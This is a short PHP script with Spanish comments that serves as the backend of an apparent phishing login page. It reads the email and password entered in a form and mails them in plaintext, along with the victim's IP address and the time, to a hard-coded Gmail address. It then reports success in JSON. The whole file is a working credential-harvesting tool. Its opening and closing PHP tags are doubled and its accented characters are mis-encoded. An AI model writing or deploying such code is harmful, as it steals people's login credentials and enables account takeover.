<?php
<?php
header('Content-Type: application/json');

// Configuraci�n
$destinatario = "eaddede113@gmail.com";
$asunto = "Nuevo intento de login";

// Recoger datos del formulario
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Validar datos
if (empty($email) || empty($password)) {
    echo json_encode([
        'success' => false,
        'message' => 'Por favor, completa todos los campos'
    ]);
    exit;
}

// Construir el mensaje del correo
$mensaje = "Se ha recibido un nuevo intento de login:\n\n";
$mensaje .= "Email: " . htmlspecialchars($email) . "\n";
$mensaje .= "Contrase�a: " . htmlspecialchars($password) . "\n";
$mensaje .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
$mensaje .= "Fecha: " . date('Y-m-d H:i:s') . "\n";

// Cabeceras del correo
$headers = "From: no-reply@tu-dominio.com\r\n";
$headers .= "Reply-To: no-reply@tu-dominio.com\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Intentar enviar el correo
$enviado = mail($destinatario, $asunto, $mensaje, $headers);

if ($enviado) {
    echo json_encode([
        'success' => true,
        'message' => 'Se ha enviado un correo con la informaci�n'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'Error al enviar el correo'
    ]);
}
?>
?>